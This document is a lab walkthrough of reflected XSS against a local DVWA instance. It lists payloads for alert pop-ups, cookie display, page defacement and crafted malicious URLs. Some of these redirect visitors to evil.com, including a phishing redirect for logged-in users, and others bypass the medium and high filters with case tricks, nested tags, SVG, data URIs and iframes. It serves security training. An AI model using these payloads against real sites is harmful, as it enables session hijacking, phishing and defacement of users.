# Reflected


## What is Reflect XSS?




# Reflected XSS Methodology

- In this i used target `DVWA`: http://192.168.100.97:8080/vulnerabilities/xss_r/
- Also in this first i set it to `LOW Level`.


## 1. BASIC REFLECTED XSS TESTS (LOW SECURITY)
- This our `target`:
<img width="902" height="728" alt="image" src="https://github.com/user-attachments/assets/249da597-a9da-40fd-85fa-8ae0de09f545" />

- In this if i input `Hello`
<img width="897" height="586" alt="image" src="https://github.com/user-attachments/assets/3da7034d-c801-4405-a527-412500c141e7" />


### Alert
````
<script>alert('Reflected XSS')</script>
````
<img width="422" height="137" alt="image" src="https://github.com/user-attachments/assets/6ddb7fe9-35b4-4ee9-a0b3-e3356765158f" />

- So this our `Result`.


### Cookie Display
````
<script>alert(document.cookie)</script>
````
<img width="901" height="484" alt="image" src="https://github.com/user-attachments/assets/108ec278-a5f5-4014-847f-3eb07b1b0470" />

<img width="431" height="216" alt="image" src="https://github.com/user-attachments/assets/4c3f2fe7-bf80-4382-b46d-047beeca4bb5" />

- So in this we see our `session cookies`.


### Image Based XSS
````
<img src=x onerror=alert('Image XSS')>
````
<img width="905" height="489" alt="image" src="https://github.com/user-attachments/assets/d9c427cb-04fe-4833-a67a-69722708a296" />

---

## 2. Use with Burp Suite
- First open `Burp Suite`:
<img width="1905" height="834" alt="image" src="https://github.com/user-attachments/assets/15a633af-97bc-4822-b18d-c4cf5976efd4" />

- And in my `Browser` i click `submite` in this:
<img width="910" height="554" alt="image" src="https://github.com/user-attachments/assets/709a9078-fd47-4eb5-a35b-de7926a5bcb0" />

- And see this:
<img width="920" height="328" alt="image" src="https://github.com/user-attachments/assets/a350b794-aa50-4c49-9d28-c41b9767ecba" />

- And see this in `Browser`:
<img width="1610" height="837" alt="image" src="https://github.com/user-attachments/assets/4ae9a529-7e47-443a-9123-321a4becc2bd" />


## Page Defacement
````
<script>document.body.innerHTML='<h1>HACKED</h1>'</script>
````
- In this i used it with my `Burp Suite`:
<img width="1575" height="870" alt="image" src="https://github.com/user-attachments/assets/ee20a7e1-54b6-4893-aced-7fd6d0574738" />

<img width="1576" height="737" alt="image" src="https://github.com/user-attachments/assets/75464173-d3bc-46c0-b49a-2314f08ad4ea" />

- Also in this we can change to something like in this i want to change `Payload`:
<img width="1573" height="757" alt="image" src="https://github.com/user-attachments/assets/48b23f20-ac83-4676-a50d-288bac003d4d" />

- In this we also can `encode` Press (Ctrl + U) -> and after click on `Send`.
<img width="1578" height="757" alt="image" src="https://github.com/user-attachments/assets/88df8a6e-9716-4608-915c-56608583c1ff" />

<img width="1577" height="458" alt="image" src="https://github.com/user-attachments/assets/24652ff9-5c03-48db-bf9c-1adabc041d73" />

---


## 3. CREATING MALICIOUS LINKS

### Basic Malicious URL Construction
- The vulnerability is in the URL parameter. Create these malicious URLs:

#### Basic Alter:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
````
<img width="1338" height="597" alt="image" src="https://github.com/user-attachments/assets/89e9cb11-a354-4f5c-a28b-962cc56ce105" />


#### Cookie Stealer:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>
````
<img width="1310" height="679" alt="image" src="https://github.com/user-attachments/assets/af88c375-e383-4299-9c11-408ee61f5b2d" />


#### Redirect Attack:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>window.location='http://evil.com'</script>
````
<img width="1347" height="696" alt="image" src="https://github.com/user-attachments/assets/157b034b-37c2-433d-a15f-369ee5254ab5" />

- In this when i Press `Enter` it will show:
<img width="1919" height="822" alt="image" src="https://github.com/user-attachments/assets/b9354dc5-52f6-4125-b65b-2b549474cf57" />


---



## 4. REDIRECT AND PHISHING ATTACKS

### Immediate Redirect
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>window.location='http://evil.com'</script>
````
<img width="1919" height="883" alt="image" src="https://github.com/user-attachments/assets/34fc02ac-d66f-4d4d-9f5d-3d521e519d7d" />



### Delayed Redirect
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>setTimeout(function() {  window.location = 'http://192.168.100.97:8080/vulnerabilities/xss_r/?hacked=true';}, 3000);alert('You will be redirected in 3 seconds...');</script>
````
- Or we can use this:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>
setTimeout(function() {
  window.location = 'http://192.168.100.97:8080/vulnerabilities/xss_r/?hacked=true';
}, 3000);
alert('You will be redirected in 3 seconds...');
</script>
````
<img width="1316" height="606" alt="image" src="https://github.com/user-attachments/assets/70136598-1539-444c-86e9-b2230f36c211" />



### Conditional Redirect (If Logged In)
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=%3Cscript%3Eif(document.cookie.includes(%27PHPSESSID%27))%20{%20%20alert(%27You%20are%20logged%20in!%20Redirecting...%27);%20%20window.location%20=%20%27http://evil.com/phishing%27;}%20else%20{%20%20alert(%27Please%20log%20in%20first%27);}%3C/script%3E
````
- Or this it the same:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<script>
if(document.cookie.includes('PHPSESSID')) {
  alert('You are logged in! Redirecting...');
  window.location = 'http://evil.com/phishing';
} else {
  alert('Please log in first');
}
</script>
````
<img width="1309" height="663" alt="image" src="https://github.com/user-attachments/assets/e972380b-9952-4fbd-b7cd-2c317c21713b" />



----



#  BYPASSING SECURITY LEVELS

## Medium Security Bypasses
<img width="818" height="693" alt="image" src="https://github.com/user-attachments/assets/2916521f-e5a0-4d59-a875-47ed1208c2c8" />


### Case Variation
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<ScRiPt>alert(1)</ScRiPt>
````
<img width="795" height="444" alt="image" src="https://github.com/user-attachments/assets/755e5d3a-1c2a-431e-a941-027cde3ea29a" />

<img width="1038" height="715" alt="image" src="https://github.com/user-attachments/assets/436ab667-6533-47fa-b589-d27dea9a54c6" />

<img width="808" height="452" alt="image" src="https://github.com/user-attachments/assets/5c076192-84c4-4679-a50e-e56fef884167" />


### Nested Script Tags:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<scr<script>ipt>alert(1)</script>
````
<img width="1036" height="544" alt="image" src="https://github.com/user-attachments/assets/ef53c4b7-f3a2-4a08-98f1-dd8b04259307" />

<img width="764" height="436" alt="image" src="https://github.com/user-attachments/assets/81037eb0-1df6-441c-bd05-a99c0c5915ba" />


### Image Tag Bypass:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>
````
<img width="798" height="440" alt="image" src="https://github.com/user-attachments/assets/941990c3-4db8-4bdc-b672-1ea9accb07ea" />



### SVG Bypass:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<svg onload=alert(1)>
````
<img width="806" height="428" alt="image" src="https://github.com/user-attachments/assets/ac35a205-8cb7-479b-97cb-01e5fd8fec9f" />

<img width="821" height="560" alt="image" src="https://github.com/user-attachments/assets/d55dfb2b-13ac-468f-8f44-cacb55dc2b62" />

---

## High Security Bypasses (Very Limited)

<img width="807" height="696" alt="image" src="https://github.com/user-attachments/assets/32fbdb3d-8d2a-40ed-b7ac-37dda9984f79" />

### Data URI Attempt:
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnSGlnaCcpPC9zY3JpcHQ+">
````
<img width="797" height="572" alt="image" src="https://github.com/user-attachments/assets/77a85d90-3643-4a3a-a945-6a15756c4adf" />


### Iframe Attempt
````
http://192.168.100.97:8080/vulnerabilities/xss_r/?name=<iframe src="javascript:alert('High')">
````



















